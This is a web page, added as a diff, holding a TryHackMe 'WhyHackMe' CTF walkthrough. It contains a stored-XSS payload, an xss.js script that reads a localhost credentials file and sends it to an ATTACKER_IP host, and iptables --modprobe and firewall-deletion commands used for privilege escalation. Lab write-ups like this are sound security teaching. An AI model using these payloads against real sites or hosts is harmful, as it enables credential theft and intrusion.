@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhyHackMe CTF Writeup | Minimalist Portfolio</title>
+<link rel="stylesheet" href="/gooduck/assets/css/style.css">
+
+<link rel="stylesheet" href="/gooduck/assets/css/posts.css">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<link rel="icon" href="data:,">
+<meta name="description" content="Cybersecurity professional specializing in ethical hacking, penetration testing, and threat hunting.">
+<meta name="keywords" content="cybersecurity, ethical hacking, penetration testing, threat hunting, security analyst">
+</head>
+<body>
+  <!-- Spotlight Cursor Effect -->
+  <div class="spotlight"></div>
+
+  <header class="header-navbar">
+    <div class="header-inner">
+       <div class="logo-quack-wrap">
+                  <div class="logo">
+                    <span class="quack-text">QUACK</span>
+                    Gooduck
+                  </div>
+                </div>
+      <nav class="nav-links">
+        <a href="/gooduck/#home">Home</a>
+        <a href="/gooduck/#experience">Experience</a>
+        <a href="/gooduck/#certifications">Certifications</a>
+        <a href="/gooduck/write-ups.html" class="active">Write-ups</a>
+      </nav>
+      <div class="social-links">
+        <a href="https://github.com/yourusername" target="_blank"><i class="fab fa-github"></i></a>
+        <a href="https://linkedin.com/in/yourprofile" target="_blank"><i class="fab fa-linkedin"></i></a>
+        <a href="mailto:your.email@example.com"><i class="fas fa-envelope"></i></a>
+      </div>
+    </div>
+  </header>
+  <div class="container post-container">
+    <main>
+      <h1 id="tryhackme-whyhackme-writeup">TryHackMe: WhyHackMe Writeup</h1>
+<p>Today we are diving into the depths of security and analysis with the WhyHackMe challenge, everyone. This room involves a variety of techniques ranging from stored XSS and internal requests to network traffic analysis and exploiting backdoors.</p>
+
+<hr />
+
+<h3 id="progress-tracker--attack-path">Progress Tracker / Attack Path</h3>
+
+<ul>
+  <li><strong>Reconnaissance:</strong> Nmap scan identifies FTP, SSH, and HTTP.</li>
+  <li><strong>Initial Discovery:</strong> Anonymous FTP access reveals a note about a localhost-only credential file.</li>
+  <li><strong>Vulnerability:</strong> Stored XSS is discovered via the registration username field.</li>
+  <li><strong>Exploitation (User):</strong> XSS is leveraged to perform an internal request to retrieve credentials for the user <code class="language-plaintext highlighter-rouge">jack</code>.</li>
+  <li><strong>Lateral Movement:</strong> Analyzing a PCAP file and manipulating <code class="language-plaintext highlighter-rouge">iptables</code> to reveal a hidden service.</li>
+  <li><strong>Privilege Escalation (www-data):</strong> Exploiting a Python backdoor found via decrypted network traffic.</li>
+  <li><strong>Root Access:</strong> Utilizing permissive sudo rights to gain full control.</li>
+</ul>
+
+<hr />
+
+<h3 id="reconnaissance">Reconnaissance</h3>
+
+<p>The initial phase begins with a comprehensive scan of the target to identify open ports and services.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "TARGET_IP whyhackme.thm" &gt;&gt; /etc/hosts
+nmap -v -p- TARGET_IP
+</code></pre></div></div>
+
+<p>The scan reveals the following open ports:</p>
+<ul>
+  <li><strong>21/tcp</strong>: FTP (vsftpd 3.0.3)</li>
+  <li><strong>22/tcp</strong>: SSH (OpenSSH 8.2p1)</li>
+  <li><strong>80/tcp</strong>: HTTP (Apache 2.4.41)</li>
+  <li><strong>41312/tcp</strong>: Filtered</li>
+</ul>
+
+<h4 id="findings">Findings</h4>
+<ul>
+  <li><strong>FTP:</strong> Anonymous login is enabled.</li>
+  <li><strong>HTTP:</strong> A web server is running on port 80.</li>
+  <li><strong>Filtered Port:</strong> Port 41312 is filtered, which suggests it might be protected by a firewall.</li>
+</ul>
+
+<hr />
+
+<h3 id="vulnerability-research-ftp--web-enumeration">Vulnerability Research: FTP &amp; Web Enumeration</h3>
+
+<p>Logging into the FTP server anonymously provides access to a file named <code class="language-plaintext highlighter-rouge">update.txt</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
+</code></pre></div></div>
+
+<p>The content of <code class="language-plaintext highlighter-rouge">update.txt</code> states that the user account <code class="language-plaintext highlighter-rouge">mike</code> was compromised and replaced. The credentials for the new account are stored in <code class="language-plaintext highlighter-rouge">127.0.0.1/dir/pass.txt</code>, but the file is only accessible via localhost.</p>
+
+<p>Next, a directory brute-force attack is performed on the web server using Gobuster.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -w /usr/share/wordlists/dirb/big.txt -u whyhackme.thm -x php,html,js,txt -b 400-500
+</code></pre></div></div>
+
+<p>The scan identifies several interesting paths:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/blog.php</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/login.php</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/register.php</code></li>
+  <li><code class="language-plaintext highlighter-rouge">/assets/</code></li>
+</ul>
+
+<hr />
+
+<h3 id="exploitation-xss-to-internal-request">Exploitation: XSS-to-Internal-Request</h3>
+
+<p>Initial attempts at SQL injection on the login page and command injection in the comment section of <code class="language-plaintext highlighter-rouge">/blog.php</code> were unsuccessful. However, a vulnerability was found in the registration process.</p>
+
+<h4 id="stored-xss-via-username">Stored XSS via Username</h4>
+<p>By registering a new account with a payload as the username, such as <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, the script executes when the username is rendered on the blog page. This occurs because the application reflects the username of the commenter without proper sanitization.</p>
+
+<h4 id="reaching-localhost">Reaching Localhost</h4>
+<p>Since we need to access <code class="language-plaintext highlighter-rouge">127.0.0.1/dir/pass.txt</code>, we can use the XSS vulnerability to make the admin’s browser (which is monitoring the comments) fetch the internal file and send the contents to us.</p>
+
+<ol>
+  <li><strong>Create a malicious script (xss.js):</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function () {
+  if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) {
+fetch("http://ATTACKER_IP:8000/steal?" + encodeURI(btoa(xhr.responseText)))
+  }
+};
+xhr.open("GET", "http://127.0.0.1/dir/pass.txt", true);
+xhr.send(null);
+</code></pre></div>    </div>
+  </li>
+  <li><strong>Inject the script via username:</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="http://ATTACKER_IP:8000/xss.js"&gt;&lt;/script&gt;
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>After the admin views the comment, the credentials for <code class="language-plaintext highlighter-rouge">jack</code> are captured: <code class="language-plaintext highlighter-rouge">j***:W************************K</code>. Using these credentials, you can log in via SSH and retrieve the first flag in <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>
+
+<hr />
+
+<h3 id="rabbit-hole-sudo-iptables">Rabbit Hole: Sudo Iptables</h3>
+
+<p>While enumerating as <code class="language-plaintext highlighter-rouge">jack</code>, it is discovered that the user has sudo permissions for <code class="language-plaintext highlighter-rouge">iptables</code>. A known technique involves using the <code class="language-plaintext highlighter-rouge">--modprobe</code> parameter to execute arbitrary commands, as detailed in this blog post:</p>
+
+<blockquote>
+  <p><strong>Room link:</strong> <a href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/">https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/
+</a></p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo -e "/bin/bash -i" &gt; exploit
+chmod +x exploit
+sudo iptables -L -t mangle --modprobe=./exploit
+</code></pre></div></div>
+
+<p>This method did not work in this specific environment, leading back to further enumeration of the file system.</p>
+
+<hr />
+
+<h3 id="escalation-traffic-analysis">Escalation: Traffic Analysis</h3>
+
+<p>Further investigation reveals several critical files:</p>
+<ul>
+  <li><strong>/var/www/html/config.php</strong>: Contains MySQL database credentials.</li>
+  <li><strong>/opt/urgent.txt</strong>: A note stating that the server was hacked and suspicious files remain in <code class="language-plaintext highlighter-rouge">/usr/lib/cgi-bin/</code>. It also mentions using <code class="language-plaintext highlighter-rouge">iptables</code> to block the attacker.</li>
+  <li><strong>/opt/capture.pcap</strong>: A packet capture of the attacker’s traffic.</li>
+</ul>
+
+<h4 id="unblocking-the-filtered-port">Unblocking the Filtered Port</h4>
+<p>The <code class="language-plaintext highlighter-rouge">iptables</code> configuration is blocking port 41312. Since <code class="language-plaintext highlighter-rouge">jack</code> can modify <code class="language-plaintext highlighter-rouge">iptables</code>, the rule can be deleted.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo iptables -D INPUT -p tcp --dport 41312 -j DROP
+</code></pre></div></div>
+<p>This command deletes the specific firewall rule that drops incoming traffic on port 41312.</p>
+
+<p>A new scan reveals the port is now open:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>41312/tcp open  ssl/http Apache httpd 2.4.41
+</code></pre></div></div>
+
+<h4 id="decrypting-the-pcap">Decrypting the PCAP</h4>
+<p>The Apache configuration in <code class="language-plaintext highlighter-rouge">site-enabled/000-default.conf</code> points to SSL certificates and keys used for the workshop on port 41312. By importing these RSA keys into Wireshark, the encrypted TLS traffic in <code class="language-plaintext highlighter-rouge">capture.pcap</code> can be read.</p>
+
+<p>Inside the decrypted traffic, a GET request to a backdoor is found:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=ls%20-al HTTP/1.1
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="root-escalation">Root Escalation</h3>
+
+<p>The script <code class="language-plaintext highlighter-rouge">5UP3r53Cr37.py</code> acts as a remote command execution point. By substituting a reverse shell command into the <code class="language-plaintext highlighter-rouge">cmd</code> parameter, access is gained as the <code class="language-plaintext highlighter-rouge">www-data</code> user.</p>
+
+<h4 id="final-privilege-escalation">Final Privilege Escalation</h4>
+<p>Checking the sudo permissions for <code class="language-plaintext highlighter-rouge">www-data</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+</code></pre></div></div>
+
+<p>The output shows that <code class="language-plaintext highlighter-rouge">www-data</code> can run any command with sudo without a password.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo su
+</code></pre></div></div>
+
+<p>This command switches the current user session to the root user. With root access, the final flag can be found in <code class="language-plaintext highlighter-rouge">/root/root.txt</code>.</p>
+
+    </main>
+  </div>
+
+  <style>
+    .modal-img-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0,0,0,0.85);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      cursor: zoom-out;
+      animation: fadeInModal 0.2s;
+    }
+    .modal-img-overlay img {
+      max-width: 90vw;
+      max-height: 90vh;
+      border-radius: 8px;
+      box-shadow: 0 4px 32px rgba(0,0,0,0.4);
+      background: #fff;
+      padding: 0.5em;
+      animation: popInModal 0.2s;
+    }
+    @keyframes fadeInModal {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes popInModal {
+      from { transform: scale(0.95); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+  </style>
+  <script>
+    // Spotlight cursor effect
+    const spotlight = document.querySelector('.spotlight');
+
+    document.addEventListener('mousemove', (e) => {
+      const x = (e.clientX / window.innerWidth) * 100;
+      const y = (e.clientY / window.innerHeight) * 100;
+      spotlight.style.setProperty('--x', `${x}%`);
+      spotlight.style.setProperty('--y', `${y}%`);
+    });
+
+    // Focus effect for cards
+    document.addEventListener('DOMContentLoaded', () => {
+      const cards = document.querySelectorAll('.project-card, .job-item');
+
+      cards.forEach(card => {
+        card.addEventListener('mouseenter', () => {
+          document.body.classList.add('focus-mode');
+        });
+
+        card.addEventListener('mouseleave', () => {
+          document.body.classList.remove('focus-mode');
+        });
+      });
+
+      // Experience tabs functionality
+      const jobItems = document.querySelectorAll('.job-item');
+      const jobDetails = document.querySelector('.job-details');
+
+      jobItems.forEach((item, index) => {
+        item.addEventListener('click', () => {
+          // Remove active class from all items
+          jobItems.forEach(i => i.classList.remove('active'));
+          // Add active class to clicked item
+          item.classList.add('active');
+
+          // Update job details
+          const jobTitle = item.querySelector('h3').textContent;
+          const company = item.querySelector('.company').textContent;
+          const bullets = item.getAttribute('data-bullets').split('|');
+
+          jobDetails.querySelector('h3').textContent = jobTitle;
+          jobDetails.querySelector('.role').textContent = company;
+
+          // Update bullets
+          const ul = jobDetails.querySelector('ul');
+          ul.innerHTML = '';
+          bullets.forEach(bullet => {
+            const li = document.createElement('li');
+            li.textContent = bullet;
+            ul.appendChild(li);
+          });
+        });
+      });
+
+      // Navigation highlighting based on scroll position
+      const navLinks = document.querySelectorAll('.nav-links a');
+      const sections = document.querySelectorAll('section[id]');
+
+      function highlightNavOnScroll() {
+        const scrollY = window.pageYOffset;
+
+        sections.forEach(section => {
+          const sectionTop = section.offsetTop - 100; // Offset for better UX
+          const sectionHeight = section.offsetHeight;
+          const sectionId = section.getAttribute('id');
+
+          if (scrollY >= sectionTop && scrollY < sectionTop + sectionHeight) {
+            navLinks.forEach(link => {
+              link.classList.remove('active');
+              if (link.getAttribute('href') === `#${sectionId}`) {
+                link.classList.add('active');
+              }
+            });
+          }
+        });
+      }
+
+      // Smooth scrolling for navigation
+      navLinks.forEach(anchor => {
+        anchor.addEventListener('click', function (e) {
+          const href = this.getAttribute('href');
+          if (href.startsWith('#')) {
+            e.preventDefault();
+            const target = document.querySelector(href);
+            if (target) {
+              target.scrollIntoView({
+                behavior: 'smooth'
+              });
+            }
+          }
+          // For external links or page links, let them navigate normally
+        });
+      });
+    });
+      // Only target images inside the writeup content
+      const content = document.querySelector('main');
+        content.querySelectorAll('img').forEach(img => {
+          img.style.cursor = 'zoom-in';
+          img.addEventListener('click', function(e) {
+            e.stopPropagation();
+            // Create overlay
+            let overlay = document.createElement('div');
+            overlay.className = 'modal-img-overlay';
+            // Clone the image for modal
+            let modalImg = document.createElement('img');
+            modalImg.src = img.src;
+            modalImg.alt = img.alt;
+            overlay.appendChild(modalImg);
+            document.body.appendChild(overlay);
+            // Remove overlay on click or ESC
+            console.log(overlay)
+            function removeOverlay() {
+              overlay.remove();
+              document.removeEventListener('keydown', escListener);
+            }
+            overlay.addEventListener('click', removeOverlay);
+            function escListener(ev) {
+              if (ev.key === 'Escape') removeOverlay();
+            }
+            document.addEventListener('keydown', escListener);
+          });
+      });
+  </script>
+</body>
+</html>
